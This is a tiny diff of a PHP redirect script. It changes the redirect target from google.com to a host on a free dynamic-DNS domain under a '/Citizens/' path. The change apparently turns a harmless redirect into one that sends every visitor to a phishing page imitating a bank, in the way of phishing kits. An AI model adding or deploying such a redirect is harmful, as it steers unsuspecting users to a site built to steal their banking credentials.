@@ -1,7 +1,7 @@
 <?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location:https://noonpush-amg.freeddns.org/Citizens/"); 
   
 exit; 
 ?> 
